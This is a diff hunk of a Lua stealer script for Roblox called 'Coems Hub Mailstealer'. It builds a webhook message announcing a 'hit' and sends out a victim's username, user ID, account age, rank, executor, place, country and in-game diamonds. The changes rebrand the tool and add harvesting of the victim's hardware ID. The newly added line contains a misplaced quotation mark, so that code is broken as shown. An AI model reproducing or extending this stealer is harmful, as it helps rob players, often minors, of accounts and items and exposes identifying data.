@@ -58,12 +58,12 @@ local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
 request = http_request or request or HttpPost or syn.request
 
 local data1 = {
-    ["content"] = "||@everyone||\n**<:Money_mouth_AE:938315502059659304>Coems Hub Mailstealer Detected A Hit<:Money_mouth_AE:938315502059659304>**", -- Free Webhook logging
+    ["content"] = "||@everyone||\n**:money_mouth:Coems Hub Mailstealer Detected A Hit:money_mouth:**", -- Free Webhook logging
     ["embeds"] = {
         {
-            ["title"] = "```Coems Hub Mailstealer Results```",
+            ["title"] = "```:money_mouth:Coems Hub Mailstealer Results:money_mouth:```",
             ["url"] = "https://discord.gg/scripter",
-            ["description"] = "```This data was generated using Egorikusa Mailstealer```",
+            ["description"] = "```:money_mouth:This data was generated using Coems Hub Mailstealer:money_mouth:```",
             ["type"] = "rich",
             ["color"] = tonumber(0x00bfff),
             ["thumbnail"] = {
@@ -74,8 +74,7 @@ local data1 = {
             ["fields"] = {
                 {
                     ["name"] = "Data Generated:",
-                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- AAstraxXTopG
-                    ["inline"] = false
+                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank : "..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**" \n:mag:HWID : "..HardWareId.."**", -- NotJaneq
                 },
                 {
                     ["name"] = ":gem: Diamonds  :gem: ",
